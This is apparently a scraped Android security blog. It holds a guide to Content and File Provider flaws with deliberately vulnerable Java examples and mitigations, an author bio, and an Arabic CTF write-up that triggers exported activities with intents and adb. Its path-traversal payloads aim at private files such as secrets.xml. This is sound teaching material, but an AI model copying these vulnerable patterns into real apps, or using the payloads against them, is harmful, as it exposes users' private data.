android:authorities=\u0026#34;com.example.provider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:permission=\u0026#34;com.example.permission.SIGNATURE_REQUIRED\u0026#34; /\u0026gt; \u0026lt;!-- Use signature-level protection for sensitive data --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.permission.SIGNATURE_REQUIRED\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; 2. Improperly Exposed Directories to FileProvider #\rVulnerability #\rAn improperly configured FileProvider can expose files and directories to an attacker. This often occurs when the FileProvider configuration uses broad path elements, such as \u0026lt;root-path\u0026gt;, which corresponds to the device\u0026rsquo;s root directory (/), or shares a wide path range like . or /.\nUsing root-path allowing arbitrary file access Sharing entire private directories (files, cache) General-purpose providers instead of specific ones Attack #\rAllowing \u0026lt;root-path\u0026gt; grants arbitrary access to files and folders, including an app\u0026rsquo;s sandbox and /sdcard directory, presenting a broad attack surface. This can enable an attacker to access sensitive information stored in databases or overwrite the application\u0026rsquo;s native libraries, potentially leading to arbitrary code execution.\nVulnerable Code Example #\r// res/xml/file_paths.xml: /* \u0026lt;paths\u0026gt; \u0026lt;root-path name=\u0026#34;root\u0026#34; path=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/paths\u0026gt; */ // Manifest: AndroidManifest.xml /* \u0026lt;provider android:name=\u0026#34;androidx.core.content.FileProvider\u0026#34; android:authorities=\u0026#34;com.example.myapp.fileprovider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.support.FILE_PROVIDER_PATHS\u0026#34; android:resource=\u0026#34;@xml/file_paths\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; */ public class FileShareActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); File file = new File(\u0026#34;/path/to/file\u0026#34;); // Vulnerable: Broad path exposes entire filesystem Uri uri = FileProvider.getUriForFile(this, \u0026#34;com.example.myapp.fileprovider\u0026#34;, file); Intent shareIntent = new Intent(Intent.ACTION_SEND); shareIntent.setData(uri); shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); startActivity(shareIntent); } } Mitigation #\r\u0026lt;!-- file_paths.xml - SECURE configuration --\u0026gt; \u0026lt;paths xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;!-- Specific subdirectory only --\u0026gt; \u0026lt;cache-path name=\u0026#34;shared_images\u0026#34; path=\u0026#34;images/\u0026#34; /\u0026gt; \u0026lt;!-- NOT entire cache: \u0026lt;cache-path name=\u0026#34;cache\u0026#34; path=\u0026#34;.\u0026#34; /\u0026gt; --\u0026gt; \u0026lt;/paths\u0026gt; \u0026lt;!-- Manifest --\u0026gt; \u0026lt;provider android:name=\u0026#34;androidx.core.content.FileProvider\u0026#34; android:authorities=\u0026#34;${applicationId}.fileprovider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.support.FILE_PROVIDER_PATHS\u0026#34; android:resource=\u0026#34;@xml/file_paths\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; Additional Mitigations:\nDo not use the \u0026lt;root-path\u0026gt; path element: This element grants arbitrary access to the entire device\u0026rsquo;s root directory Share narrow path ranges: Instead of broad path ranges like . or /, specify limited and narrow paths in the FileProvider configuration Grant minimum access permissions: When granting content URI permissions, ensure only the minimum necessary access is given Avoid \u0026lt;external-path\u0026gt; for sensitive data: Sensitive data should not be stored in external storage accessible via \u0026lt;external-path\u0026gt; 3. Path Traversal when using data from Uri #\rVulnerability #\rThis common mistake occurs when developers use data from Uri methods like Uri.getLastPathSegment() or Uri.getPathSegments() without proper validation before passing it to file system APIs. These methods decode URL-encoded values, which attackers can exploit.\nUsing Uri.getLastPathSegment() without validation URL-decoded values allowing ..%2F injection Trusting ContentProvider-provided filenames Attack #\rAn attacker can provide a URL-encoded path traversal sequence (e.g., %2F for /) within a URI. When the vulnerable app decodes and uses this URI segment, it can be tricked into accessing or modifying files outside the intended directory. For example, an attacker could craft a URI like content://com.victim.path_traversal/..%2Fshared_prefs%2Fsecrets.xml to retrieve the contents of the secrets.xml file, which is typically stored in a private directory.\nVulnerable Code Example #\rpublic class FileAccessActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Uri uri = getIntent().getData(); if (uri != null) { // Vulnerable: No validation of fileName allows path traversal String fileName = uri.getLastPathSegment(); File file = new File(getFilesDir(), fileName); if (file.exists()) { try { FileInputStream fis = new FileInputStream(file); // Process file } catch (FileNotFoundException e) { e.printStackTrace(); } } } } } Mitigation #\r// SECURE: Validate file paths private File getSecureFile(Uri uri) { String filename = uri.getLastPathSegment(); if (filename == null) return null; // Re-encode to prevent path traversal filename = Uri.encode(filename); File file = new File(getSecureDirectory(), filename); try { // Validate canonical path is within expected directory String canonicalPath = file.getCanonicalPath(); String secureDir = getSecureDirectory().getCanonicalPath(); if (!canonicalPath.startsWith(secureDir)) { throw new SecurityException(\u0026#34;Path traversal attempt detected\u0026#34;); } return file; } catch (IOException e) { return null; } } // Generate unique filenames instead of trusting input private String generateUniqueFilename(String extension) { return UUID.randomUUID().toString() + \u0026#34;.\u0026#34; + extension; } Additional Mitigations:\nValidate the resulting path: Canonicalize the path using File.getCanonicalPath() and compare its prefix with the expected safe directory Implement additional validation: Include checks to prevent accidental overwrites and confirm operations occur in the expected directory Avoid sharing broad folders in Content Providers: Ensure Content Providers do not expose \u0026ldquo;broad\u0026rdquo; folders like files or cache 4. Trusting ContentProvider-Provided Filename #\rVulnerability #\rIf a client application doesn\u0026rsquo;t correctly handle a filename provided by a FileProvider, a malicious application can implement its own FileProvider to provide a crafted filename.\nAttack #\rA malicious FileProvider can supply a filename that includes path traversal characters (e.g., ../). When the victim client application attempts to write the received file to its storage using this untrusted filename, it might overwrite its own critical files, such as application code, shared preferences, or other configuration files, potentially leading to malicious code execution or altered application behavior.\nVulnerable Code Example #\rpublic class FileWriteActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Uri uri = getIntent().getData(); if (uri != null) { // Vulnerable: Uses untrusted filename directly String fileName = uri.getLastPathSegment(); File outputFile = new File(getFilesDir(), fileName); try { OutputStream os = new FileOutputStream(outputFile); // Write data to outputFile } catch (FileNotFoundException e) { e.printStackTrace(); } } } } Mitigation #\rDon\u0026rsquo;t trust user input for filenames: When a client application writes a received file, it should ignore the filename provided by the \u0026ldquo;server\u0026rdquo; application and instead generate its own unique filename Sanitize provided filenames (less desirable): If unique filenames cannot be generated, sanitize the provided filename by removing path traversal characters and performing canonicalization 5. Exploiting Implicit Intents for File Theft and Overwriting #\rVulnerability #\rApplications often launch implicit intents (e.g., ACTION_PICK, GET_CONTENT, IMAGE_CAPTURE) to interact with other apps, such as file managers or camera apps, to obtain a URI to a file. If the vulnerable app then copies the content from this URI to its public storage or processes it insecurely, it can be exploited.\nAttack for File Theft #\rA malicious app can register an intent-filter with a high priority (android:priority=\u0026quot;999\u0026quot;) to intercept these implicit intents. Instead of providing a legitimate file, the malicious app returns a file:// URI that points to a sensitive file within the victim app\u0026rsquo;s private directory. When the victim app receives this malicious URI and attempts to copy its content, it unknowingly copies its own private data to a public directory, which the attacker can then read.\nAttack for Arbitrary File Overwriting #\rSimilarly, an attacker can use a malicious ContentProvider to return a filename that contains path traversal. If the vulnerable app copies the content using this filename, it could write arbitrary data to a sensitive location, like a native library file (.so), which could lead to arbitrary code execution within the victim app\u0026rsquo;s context.\nVulnerable Code Example #\rpublic class FilePickerActivity extends Activity { private static final int REQUEST_CODE = 1; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent intent = new Intent(Intent.ACTION_GET_CONTENT); intent.setType(\u0026#34;*/*\u0026#34;); startActivityForResult(intent, REQUEST_CODE); } @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == REQUEST_CODE \u0026amp;\u0026amp; resultCode == RESULT_OK) { Uri uri = data.getData(); // Vulnerable: No validation of URI source File publicFile = new File(Environment.getExternalStorageDirectory(), \u0026#34;public_file\u0026#34;); try { InputStream is = getContentResolver().openInputStream(uri); OutputStream os = new FileOutputStream(publicFile); byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1) { os.write(buffer, 0, len); } is.close(); os.close(); } catch (IOException e) { e.printStackTrace(); } } } } Mitigation #\rUse internal storage for sensitive data: Always store sensitive application data in internal storage, which is restricted to the owning application Avoid public file storage: Do not use public file storage for caching or any other operations with sensitive data Encrypt sensitive data: If sensitive data must be stored on external storage, it should be encrypted using a strong algorithm Perform integrity checks: For data or code loaded from external storage, implement integrity checks using hashes Make intents explicit: Unless absolutely required, use explicit intents by calling setPackage() Omit sensitive information from implicit intents: Do not include sensitive information or mutable objects Validate external URIs: Check URIs from file:// or content:// schemes to ensure they do not point to local private files 6. Proxying Requests to More Secure Providers #\rVulnerability #\rLower-permission provider proxying to higher-permission provider Dynamic URIs allowing attacker control over target provider Note on Vulnerable Code Example #\rThe vulnerable code example for this vulnerability is complex and typically involves multiple ContentProviders. It involves a less secure provider forwarding requests to a secure one without proper authorization.\nMitigation #\r// SECURE: Validate incoming URIs with allowlist private static final Set\u0026lt;String\u0026gt; ALLOWED_AUTHORITIES = Set.of( \u0026#34;com.example.safe.provider1\u0026#34;, \u0026#34;com.example.safe.provider2\u0026#34; ); private boolean isUriSafe(Uri uri) { String authority = uri.getAuthority(); return ALLOWED_AUTHORITIES.contains(authority); } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { if (!isUriSafe(uri)) { throw new SecurityException(\u0026#34;Unauthorized provider access attempt\u0026#34;); } // Safe to proceed... } 7. Theft of Arbitrary Files via File Choosers in WebView #\rVulnerability #\rIf an app implements WebChromeClient.onShowFileChooser() to allow users to select files from their device, but without proper validation of the chosen file\u0026rsquo;s URI, it can be vulnerable.\nAttack #\rAn attacker can provide a specially crafted URL to the WebView that includes an \u0026lt;input type=\u0026quot;file\u0026quot;\u0026gt; element. The attacker\u0026rsquo;s app can then intercept the implicit intent launched by onShowFileChooser() and return the URI of a protected file from the victim\u0026rsquo;s private storage. The WebView then receives this URI and can potentially leak the content of the protected file.\nVulnerable Code Example #\rpublic class WebViewActivity extends Activity { private static final int REQUEST_CODE = 1; private ValueCallback\u0026lt;Uri[]\u0026gt; filePathCallback; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); WebView webView = new WebView(this); setContentView(webView); webView.setWebChromeClient(new WebChromeClient() { @Override public boolean onShowFileChooser(WebView webView, ValueCallback\u0026lt;Uri[]\u0026gt; filePathCallback, FileChooserParams fileChooserParams) { // Vulnerable: No validation of chosen file WebViewActivity.this.filePathCallback = filePathCallback; Intent intent = fileChooserParams.createIntent(); startActivityForResult(intent, REQUEST_CODE); return true; } }); } @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == REQUEST_CODE \u0026amp;\u0026amp; resultCode == RESULT_OK) { Uri result = data.getData(); filePathCallback.onReceiveValue(new Uri[]{result}); } } } Mitigation #\rDisable file access in WebSettings: Set WebSettings.setAllowFileAccess(false), WebSettings.setAllowFileAccessFromFileURLs(false), and WebSettings.setAllowUniversalAccessFromFileURLs(false) Disable content access in WebSettings: Call WebSettings.setAllowContentAccess(false) Use WebViewAssetLoader: This method provides a secure way to access local files via an http(s):// scheme Validate all URLs and origins: When loading external links in WebView, rigorously validate both the scheme and host Sanitize JavaScript with external data: Ensure any externally obtained data used with JavaScript has been properly sanitized Prevent WebView from loading untrusted content: If JavaScript execution and file access are enabled, strictly limit content loaded to trusted URLs 8. Gaining Access via Intent Redirection to Protected Components #\rVulnerability #\rAn app with an exported activity that takes an Intent from outside and returns it via Activity.setResult() without filtering unsafe flags, can be forced to grant permissions to Content Providers with the android:grantUriPermissions=\u0026quot;true\u0026quot; flag.\nAttack #\rAn attacker sends an intent to this vulnerable activity. This intent includes a data URI pointing to the target ContentProvider and sets flags like Intent.FLAG_GRANT_READ_URI_PERMISSION. Because the vulnerable activity automatically returns the received intent (with its flags) via setResult(), the attacker\u0026rsquo;s app receives this modified intent back, now possessing the granted read permission for the specified URI. This allows the attacker to steal or rewrite protected or arbitrary files belonging to the victim application.\nVulnerable Code Example #\rpublic class VulnerableActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); // Vulnerable: Returns intent without filtering flags Intent intent = getIntent(); setResult(RESULT_OK, intent); finish(); } } Mitigation #\rNever redirect Intents in full: Instead of returning an Intent entirely, filter it to include only necessary data and remove any unsafe flags Filter intent flags: Ensure that flags like FLAG_GRANT_READ_URI_PERMISSION and FLAG_GRANT_WRITE_URI_PERMISSION are handled securely Validate intent components: When an Intent is created from a URL in WebView, reset the component and selector fields Check if activity is exported: Before launching an activity from a URL-derived Intent, verify that the target activity is explicitly exported Don\u0026rsquo;t export sensitive components: Avoid exporting components that access sensitive resources unless absolutely necessary Require permissions for sensitive tasks: For any exported component performing sensitive tasks, explicitly require appropriate permissions Apply signature-based permissions: When sharing data between your own ecosystem of apps, use signature protection level permissions Implement single-task endpoints: Design components to perform a small, specific set of tasks with granular privileges 9. SQL Injection in Shared Databases #\rVulnerability #\rMultiple providers sharing same SQLite database SQL injection in less secure provider affecting secure provider\u0026rsquo;s data Vulnerable Code Example #\rpublic class VulnerableContentProvider extends ContentProvider { private DatabaseHelper dbHelper; @Override public boolean onCreate() { dbHelper = new DatabaseHelper(getContext()); return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Vulnerable: Uses raw SQL with untrusted input SQLiteDatabase db = dbHelper.getReadableDatabase(); return db.rawQuery(\u0026#34;SELECT * FROM table WHERE \u0026#34; + selection, selectionArgs); } // Other required methods omitted for brevity } Mitigation #\r// SECURE: Use separate databases for different security levels public class SecureProvider extends ContentProvider { private SQLiteDatabase mSecureDb; @Override public boolean onCreate() { SQLiteOpenHelper helper = new MySecureDbHelper(getContext(), \u0026#34;secure.db\u0026#34;); mSecureDb = helper.getWritableDatabase(); return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Use parameterized queries SQLiteQueryBuilder builder = new SQLiteQueryBuilder(); builder.setStrict(true); builder.setStrictColumns(true); builder.setStrictGrammar(true); return builder.query(mSecureDb, projection, selection, selectionArgs, null, null, sortOrder); } } 10. Zip Path Traversal (ZipSlip) #\rVulnerability #\rWhen an Android app extracts files from compressed archives (like ZIP files), if the extraction logic doesn\u0026rsquo;t validate the filenames within the archive for directory traversal characters (../), it can be vulnerable.\nAttack #\rAn attacker crafts a malicious ZIP file where entries have filenames like ../../../../data/data/com.victim/files/sensitive.txt. When the vulnerable app unpacks this archive, it could write arbitrary files to locations outside the intended destination directory, potentially overwriting application configuration files, databases, or even native libraries, leading to code execution.\nVulnerable Code Example #\rpublic class ZipExtractor { public void extractZip(File zipFile, File outputDir) throws IOException { ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile)); ZipEntry entry; while ((entry = zis.getNextEntry()) != null) { // Vulnerable: No validation of entry name String entryName = entry.getName(); File outputFile = new File(outputDir, entryName); OutputStream os = new FileOutputStream(outputFile); byte[] buffer = new byte[1024]; int len; while ((len = zis.read(buffer)) != -1) { os.write(buffer, 0, len); } os.close(); zis.closeEntry(); } zis.close(); } } Mitigation #\rVerify target path is a child of destination directory: Before extracting each entry from a ZIP archive, always verify that the target path is a child of the intended destination directory by comparing their canonical paths Ensure destination directory is empty: To prevent accidentally overwriting existing files, make sure the extraction destination directory is empty before starting the extraction process Security \u0026amp; Best Practices #\rPermission Strategy #\r[!IMPORTANT] Principle of Least Privilege Only request necessary permissions and avoid being \u0026ldquo;overzealous\u0026rdquo;. Users implicitly grant requested permissions during installation.\nRestrict Access Through Permissions #\r\u0026lt;!-- Example secure provider configuration --\u0026gt; \u0026lt;provider android:name=\u0026#34;.SecureProvider\u0026#34; android:authorities=\u0026#34;com.example.secure.provider\u0026#34; android:exported=\u0026#34;true\u0026#34; android:readPermission=\u0026#34;com.example.permission.READ_DATA\u0026#34; android:writePermission=\u0026#34;com.example.permission.WRITE_DATA\u0026#34;\u0026gt; \u0026lt;!-- Extra protection for sensitive paths --\u0026gt; \u0026lt;path-permission android:path=\u0026#34;/admin/*\u0026#34; android:readPermission=\u0026#34;com.example.permission.ADMIN_READ\u0026#34; android:writePermission=\u0026#34;com.example.permission.ADMIN_WRITE\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;!-- Define custom permissions --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.permission.READ_DATA\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; Secure Data Storage #\r[!WARNING] Keep Data Private Store data in internal files, SQLite databases, or cloud and keep these private to your application.\nAvoid world-readable/writable: Don\u0026rsquo;t set internal files or SQLite databases to world-readable/writable SQLite databases are private by default This prevents permissions bypass Prevent SQL Injection #\r[!DANGER] SQL Injection Prevention Always sanitize user input when querying, inserting, updating, or deleting data.\nRecommended approach:\n// SECURE: Use selection with replaceable parameters String selection = \u0026#34;column = ?\u0026#34;; String[] selectionArgs = {\u0026#34;user_input\u0026#34;}; Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, sortOrder); // INSECURE: Direct string concatenation String selection = \u0026#34;column = \u0026#39;\u0026#34; + userInput + \u0026#34;\u0026#39;\u0026#34;; // DON\u0026#39;T DO THIS! Additional protections:\nUse PreparedStatement objects Use Android\u0026rsquo;s built-in query() methods Configure SQLiteQueryBuilder with setStrict(), setStrictColumns(), setStrictGrammar() Consider Room Persistence Library for compile-time SQL verification Implementation Best Practices #\rThread Safety #\r[!NOTE] Thread Safety All ContentProvider methods except onCreate() can be called by multiple threads simultaneously - implementations must be thread-safe.\nEfficient onCreate() #\r@Override public boolean onCreate() { // Only fast-running initialization here // Defer heavy tasks like database creation until needed // This prevents slowing down provider startup return true; } Contract Classes #\r// Define constants in public final contract class public final class MyContract { public static final String AUTHORITY = \u0026#34;com.example.provider\u0026#34;; public static final Uri BASE_URI = Uri.parse(\u0026#34;content://\u0026#34; + AUTHORITY); // Table contracts public static final class Users implements BaseColumns { public static final Uri URI = Uri.withAppendedPath(BASE_URI, \u0026#34;users\u0026#34;); public static final String TABLE_NAME = \u0026#34;users\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; public static final String COLUMN_EMAIL = \u0026#34;email\u0026#34;; } } In The end #\r[!TIP] Key Takeaways\nPrinciple of Least Privilege - Only grant necessary permissions Defense in Depth - Multiple security layers (export, permissions, validation) Simplicity - Keep providers focused on data access only Validation - Always validate and sanitize input Separation - Isolate different security levels Resources #\rDocumentation #\rAndroid Content Providers Guide Content Provider Security FileProvider Documentation Security Resources #\rOWASP Mobile Security Testing Guide - Content Providers drozer - Android Security Assessment Framework Best Practices #\rAndroid Security Tips Secure Coding Guidelines ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/providers/","section":"","summary":"","title":"Content \u0026 File Providers","type":"posts"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/contnet-provider/","section":"Tags","summary":"","title":"Contnet Provider","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/deep-link/","section":"Tags","summary":"","title":"Deep Link","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/tags/deep-links/","section":"Tags","summary":"","title":"Deep Links","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/file-provider/","section":"Tags","summary":"","title":"File Provider","type":"tags"},{"content":"\rAbout Me #\r👋 Hey there, I\u0026rsquo;m Saeed khalid your friendly neighborhood cybersecurity explorer.\nI\u0026rsquo;m a 3rd year computer Engineering student @shoubra , and self-taught enthusiast with a intrest in breaking down systems and brainstorm solutions. My journey so far is a mix betwen red team \u0026amp; blue team with focus now on android and networking\n🔐 My Cybersecurity Journey #\rI’m obsessed with securing the digital world while mastering the art of ethical hacking. My focus spans:\n🛡️ Red: I dive deep into web app vulnerabilities, Android app weaknesses, and network exploitation. 🔍 Reverse Engineering: I used Jadx, Ghidra, and Binary Ninja to unravel Android APKs, analyzing bytecode and runtime behaviors to uncover risks. 🧪 Security Education: I lead workshops in msp team helping other with what i learned. 🧰 CTF \u0026amp; Labs: Iam trying to craft vulnerable PHP web apps for hands-on practice, covering SQLi, XSS, IDOR, and more, to sharpen my skills and teach others. 💼 Internships #\rNetwork Security Intern – National Telecommunication Institute (NTI) | 120 hours\nDeveloped real-world soft skills through interactive learning and projects. Created projects to deepen understanding of network security concepts. Cyber Security Intern – Amideast | 180 hours\nCompleted Google Career Certificate in Cybersecurity via Coursera scholarship. Gained hands-on experience in both defensive and offensive security. 📜 Certifications #\rGoogle Cybersecurity Certificate | Google Career Certificates – 180H Android | Hextree – 6.5H Learn Android Application Development | Udemy – 27H Android App Hacking – Black Belt Edition | Udemy – 55H 📱 Beyond cybersecurity #\ri like creating stuf when ever i can\n💾 Embedded Systems: I played with PIC16F877A microcontrollers, writing firmware to program a trafic light 🤖 Android Development: 🎮 Projects #\rHere’s some of my creations that saw light:\n🧠 MIPS Assembly Centipede: Built a retro-style Centipede game in MIPS assembly using MARS, complete with collision detection, blaster mechanics, and entity logic.\n🛰️ A Pathfinding in MIPS*: Developed a pathfinding algorithm with a binary min-heap priority queue, proving efficiency in low-level programming.\n🌐 Cybersecurity Blog: Running a Hugo-powered blog with the Blowfish theme, documenting my journey with Arabic support, dynamic Firebase features (likes, comments, views), and a sleek, moving background.\n🏆 Awards \u0026amp; Achievements #\rRanked in the Top 10% on TryHackMe | Sept 2024 🧠 Always Evolving #\rI’m constantly sharpening my skills and chasing new challenges:\n🏆 Certifications in Progress: Studying for eJPT and OSCP to solidify my expertise in penetration testing. 📚 Deep Dives: Obsessed with Android Runtime (ART), mobile app hardening, secure coding, and bug bounty methodologies. 🛠️ Tools \u0026amp; Techniques: Staying current with tools like Frida, Wireshark, and OWASP ZAP, and exploring advanced topics like kernel exploits and cloud security. 📸 Life Beyond the Terminal #\rWhen I’m not battling bugs or writing code, I’m out exploring the world:\n🏃 Sunrise Runs: Chasing the perfect orange sky with my camera, capturing nature’s beauty. 📖 reader: reaading novels like 1984 and others. 🎨 Creative Coding: Experimenting with animations and dynamic web features to bring my blog to life. 🤝 Let’s Hack the Future Together #\rI’m always up for collaborating on cybersecurity research, bug bounties, or innovative projects. Whether you’re into hacking, defending, or building cool tech, let’s connect and make the digital world a safer (and more exciting) place.\n🧑‍💻 “In a world of ones and zeros, I chase the greys.”\n📫 Get in Touch #\rEmail: happyk1309@gmail.com GitHub: github.com/happy-joyboy LinkedIn: linkedin.com/in/saeed-khalid-awaad Blog: Explore my cybersecurity journey on my blog! ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/about/","section":"JoyBoy","summary":"wfwef","title":"First","type":"page"},{"content":"\rsomething new #\rMay this be the end And start of something new\nMin\u0026rsquo;na, N arigato gozaimasu\n","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/first/","section":"","summary":"?","title":"First","type":"posts"},{"content":"\rFlag 1 #\rتحليل الكود #\rpublic class Flag1Activity extends AppCompactActivity { public Flag1Activity() { this.name = \u0026#34;Flag 1 - Basic exported activity\u0026#34;; this.flag = \u0026#34;zABitOReWutKdkrMKx2NPVXklOmLz1SB85u2kJjUe1ojI9LMWkbEKkjANz15WHmb\u0026#34;; } protected void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); this.f.addTag(\u0026#34;basic-main-activity-avd2\u0026#34;); success(this); } لما الـ activity دي بتستدعا ، الـ constructor هيحط اسم الـ activity \u0026ldquo;Flag 1 - Basic exported activity\u0026rdquo; ويعرّف متغير الـ flag. الـ LogHelper ده بيستخدم عشان يضيف tag اسمه \u0026ldquo;basic-main-activity-avd2\u0026rdquo; وبعدين method success بتتنادى.\nالحل #\rيعني بس بتشغيل الـ activity دي الـ method هتشتغل وده ممكن يحصل بـ Explicit intent. من الكود نلاقي:\npackage= \u0026ldquo;io.hextree.attacksurface\u0026rdquo; class name : io.hextree.attacksurface.activities.Flag1Activity Java:\nIntent EvilIntent = new Intent(); EvilIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag1Activity\u0026#34; )); startActivity(EvilIntent); ADB:\nadb shell am start-activity io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity Flag 2 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag2Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; هنا الـ Filter بيوضح إن الـ Activity ده بيسمع لـ action string: io.hextree.action.GIVE_FLAG و كده هيقدر يستقبل intent العنده الـ action ده\nprotected void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); String action = getIntent().getAction(); if (action == null || !action.equals(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;)) { return; } this.f.addTag(action); success(this); } الـ Intent بيتستقبل بالـ getIntent() والـ action بيتقرا ب getAction() وبعدين يتحفظ في string action، ثم يتشيك لو null (فاضي) أو مختلف عن الـ flag. لو كله تمام وسليم، success() بتتنادى.\nالحل #\rنحط الـ flag و نحط الـ Package والـ activity name الصح\nIntent EvilIntent = new Intent(); EvilIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag2Activity\u0026#34; )); EvilIntent.setAction(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;); startActivity(EvilIntent); Flag 3 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag3Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; هنا الـ filter بيشيك على حاجتين:\naction name specific data / content -\u0026gt; url اللي هو https protocol Intent intent = getIntent(); String action = intent.getAction(); if (action == null || !action.equals(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;)) { return; } this.f.addTag(action); Uri data = intent.getData(); if (data == null || !data.toString().equals(\u0026#34;https://app.hextree.io/map/android\u0026#34;)) { return; } this.f.addTag(data); success(this); هيتستقبل intent والـ action بتتشيك وبعدين الـ data بتتحفظ في متغير نوع Uri وبعدين تتشيك بعد ما تتحول لـ string ولو زي بعض، الـ condition هيتخطى وsuccess هتتنادى.\nالحل #\rمن تحليلنا:\npackage= \u0026ldquo;io.hextree.attacksurface\u0026rdquo; Intent action: \u0026quot;io.hextree.action.GIVE_FLAG\u0026quot; data : \u0026ldquo;https://app.hextree.io/map/android\" class name : io.hextree.attacksurface.activities.Flag3Activity Intent EvilIntent = new Intent(); EvilIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag3Activity\u0026#34; )); EvilIntent.setAction(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;); EvilIntent.setData(Uri.parse(\u0026#34;https://app.hextree.io/map/android\u0026#34;)); startActivity(EvilIntent); Flag 4 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); stateMachine(getIntent()); } الـ constructor بينادى على onCreate() والـ starMachine() بتتنادى والـ intent المستقبل بيتبعت ليها\npublic void stateMachine(Intent intent) { String action = intent.getAction(); int ordinal = getCurrentState().ordinal(); if (ordinal != 0) { if (ordinal != 1) { if (ordinal != 2) { if (ordinal == 3) { this.f.addTag(State.GET_FLAG); setCurrentState(State.INIT); success(this); return; } if (ordinal == 4 \u0026amp;\u0026amp; \u0026#34;INIT_ACTION\u0026#34;.equals(action)) { setCurrentState(State.INIT); Toast.makeText(this, \u0026#34;Transitioned from REVERT to INIT\u0026#34;, 0).show(); return; } } else if (\u0026#34;GET_FLAG_ACTION\u0026#34;.equals(action)) { setCurrentState(State.GET_FLAG); Toast.makeText(this, \u0026#34;Transitioned from BUILD to GET_FLAG\u0026#34;, 0).show(); return; } } else if (\u0026#34;BUILD_ACTION\u0026#34;.equals(action)) { setCurrentState(State.BUILD); Toast.makeText(this, \u0026#34;Transitioned from PREPARE to BUILD\u0026#34;, 0).show(); return; } } else if (\u0026#34;PREPARE_ACTION\u0026#34;.equals(action)) { setCurrentState(State.PREPARE); Toast.makeText(this, \u0026#34;Transitioned from INIT to PREPARE\u0026#34;, 0).show(); return; } Toast.makeText(this, \u0026#34;Unknown state. Transitioned to INIT\u0026#34;, 0).show(); setCurrentState(State.INIT); } الـ activity ده بيطبق \u0026ldquo;state machine\u0026rdquo; اللي بيفتكر حالته عبر 